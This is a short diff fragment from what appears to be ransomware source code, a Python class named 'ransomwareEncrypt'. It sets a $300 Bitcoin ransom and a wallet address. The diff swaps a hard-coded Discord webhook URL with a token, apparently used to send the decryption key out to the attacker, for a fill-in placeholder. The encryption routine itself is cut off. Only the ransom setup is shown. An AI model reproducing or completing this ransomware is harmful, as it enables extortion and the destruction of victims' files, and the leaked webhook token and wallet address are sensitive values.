@@ -15,7 +15,7 @@ class ransomwareEncrypt:
         self.priceToAsk = "$300"
         self.wallet_url = "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh"
         self.currency = "Bitcoin"
-        self.dc_webhook = DiscordWebhook("https://discord.com/api/webhooks/978619729176567879/p5RU8Wak-m83cP78Giu3vcdtpKgXrQJD6iICXcc3rZyu4OgDtx3MHS1VBXsffg4lDzUl")
+        self.dc_webhook = DiscordWebhook("ENTER YOUR WEBHOOK URL HERE TO GET THE KEY")
 
     def encrypt_files(self):
         classRedirect = ransomwareEncrypt()
